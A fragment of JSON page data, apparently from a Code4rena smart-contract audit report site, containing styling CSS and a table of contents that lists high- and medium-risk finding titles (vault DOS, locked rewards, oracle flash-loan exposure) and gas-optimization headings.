}\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk14 { color: #F44747; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-3\">High Risk Findings (3)</a></p>\n<ul>\n<li><a href=\"#h-01-re-balancing-the-vault-allocation-may-always-revert-when-distributing-profits-resulting-of-a-massive-system-dos--\">[H-01] Re-balancing the vault allocation may always revert when distributing profits: resulting of a massive system DOS  </a></li>\n<li><a href=\"#h-02-user-can-lose-up-to-whole-stake-on-vault-withdrawal-when-there-are-funds-locked-in-the-strategy\">[H-02] User can lose up to whole stake on vault withdrawal when there are funds locked in the strategy</a></li>\n<li><a href=\"#h-03-rewards-will-be-locked-in-lqtystaking-contract\">[H-03] Rewards will be locked in LQTYStaking Contract</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-14\">Medium Risk Findings (14)</a></p>\n<ul>\n<li><a href=\"#m-01-low-data-feed-frequency-from-tellor-makes-your-protocol-vulnerable-to-flash-loan-attacks\">[M-01] Low data feed frequency from Tellor makes your protocol vulnerable to flash loan attacks</a></li>\n<li><a href=\"#m-02-_harvestcore-roi-calculation-error\">[M-02] <code>_harvestCore()</code> roi calculation error</a></li>\n<li><a href=\"#m-03-reaperbasestrategyv4harvest-might-revert-in-an-emergency\">[M-03] <code>ReaperBaseStrategyv4.harvest()</code> might revert in an emergency.</a></li>\n<li><a href=\"#m-04-in-reapervaultv2-we-should-update-lockedprofit-and-lastreport-before-changing-lockedprofitdegradation\">[M-04] In <code>ReaperVaultV2</code>, we should update <code>lockedProfit</code> and <code>lastReport</code> before changing <code>lockedProfitDegradation</code></a></li>\n<li><a href=\"#m-05-upgradeprotocol-can-create-peg-risk-via-oracle-price-arbitrage\">[M-05] <code>upgradeProtocol</code> can create Peg Risk via Oracle Price Arbitrage</a></li>\n<li><a href=\"#m-06-denial-of-liquidations-and-redemptions-by-borrowing-all-reserves-from-aave\">[M-06] Denial of Liquidations and Redemptions by borrowing all reserves from AAVE</a></li>\n<li><a href=\"#m-07-domain_separator-is-missing-in-lusdtokensol\">[M-07] <code>DOMAIN_SEPARATOR()</code> is missing in LUSDToken.sol</a></li>\n<li><a href=\"#m-08-if-the-strategy-incurs-a-loss-the-active-pool-will-stop-working-until-the-shortfall-is-paid-out-entirely\">[M-08] If the strategy incurs a loss the Active Pool will stop working until the shortfall is paid out entirely</a></li>\n<li><a href=\"#m-09-last-trove-may-be-prevented-from-redeeming\">[M-09] Last Trove may be prevented from redeeming</a></li>\n<li><a href=\"#m-10-p-can-be-updated-to-zero-which-can-cause-a-dos-when-liquidating-troves\">[M-10] P can be updated to zero which can cause a DOS when liquidating troves</a></li>\n<li><a href=\"#m-11-updatestrategyallocbps-can-cause-loss-of-activepools-collateral-during-an-emergency-exit\">[M-11] <code>updateStrategyAllocBPS()</code> can cause loss of ActivePool’s collateral during an emergency exit</a></li>\n<li><a href=\"#m-12-reapervaulterc4626-is-not-eip-4626-compliant-and-integrations-can-result-in-loss-of-funds\">[M-12] ReaperVaultERC4626 is not EIP-4626 compliant and integrations can result in loss of funds</a></li>\n<li><a href=\"#m-13-dos-by-directly-transferring-assets-to-reaper-vault\">[M-13] DOS by directly transferring assets to Reaper Vault</a></li>\n<li><a href=\"#m-14-lastfeeoperationtime-is-not-modified-correctly-in-function-_updatelastfeeoptime-resulting-a-much-slower-decay-model-for-borrowing-base-rate\">[M-14] <code>lastFeeOperationTime</code> is not modified correctly in function <code>_updateLastFeeOpTime()</code>, resulting a much slower decay model for borrowing base rate</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#executive-summary\">Executive Summary</a></li>\n<li><a href=\"#1-vault\">1. Vault</a></li>\n<li><a href=\"#2-redemption-helper\">2. Redemption Helper</a></li>\n<li><a href=\"#3-defaultpool\">3. DefaultPool</a></li>\n<li><a href=\"#4-collateralconfig\">4. CollateralConfig</a></li>\n<li><a href=\"#5-borroweroperations\">5. BorrowerOperations</a></li>\n<li><a href=\"#6-activepool\">6. ActivePool</a></li>\n<li><a href=\"#7-communityissuance\">7. CommunityIssuance</a></li>\n<li><a href=\"#8-price-feed\">8. Price Feed</a></li>\n<li><a href=\"#9-lqty-staking\">9. LQTY Staking</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#tightly-pack-storage-variablesoptimize-the-order-of-variable-declarationtotal-gas-saved-16k-gas\">Tightly pack storage variables/optimize the order of variable declaration(Total Gas saved: 16K gas)</a></li>\n<li><a href=\"#pack-structs-by-putting-data-types-that-fit-together-next-to-each-othersaves-2k-gas\">Pack structs by putting data types that fit together next to each other(Saves: 2K gas)</a></li>\n<li><a href=\"#emitting-storage-values-instead-of-the-memory-one\">Emitting storage values instead of the memory one.</a></li>\n<li><a href=\"#ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">IF’s/require() statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#internalprivate-functions-only-called-once-can-be-inlined-to-save-gas\">Internal/Private functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\">Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</a></li>\n<li><a href=\"#using-storage-instead-of-memory-for-structsarrays-saves-gas\">Using storage instead of memory for structs/arrays saves gas</a></li>\n<li><a href=\"#avoid-contract-existence-checks-by-using-solidity-version-0810-or-later\">Avoid contract existence checks by using solidity version 0.8.10 or later</a></li>\n<li><a href=\"#x--y-costs-more-gas-than-x--x--y-for-state-variables\">x += y costs more gas than x = x + y for state variables</a></li>\n<li><a href=\"#using-unchecked-blocks-to-save-gas\">Using unchecked blocks to save gas</a></li>\n<li><a href=\"#splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\">Splitting require() statements that use &#x26;&#x26; saves gas - (saves 8 gas per &#x26;&#x26;)</a></li>\n<li><a href=\"#use-the-cached-value-in-the-following-to-save-gas\">Use the cached value in the following to save gas.</a></li>\n<li><a href=\"#caching-global-variables-is-expensive-than-using-the-variable-itself\">Caching global variables is expensive than using the variable itself</a></li>\n<li><a href=\"#use-a-more-recent-version-of-solidity\">Use a more recent version of solidity</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}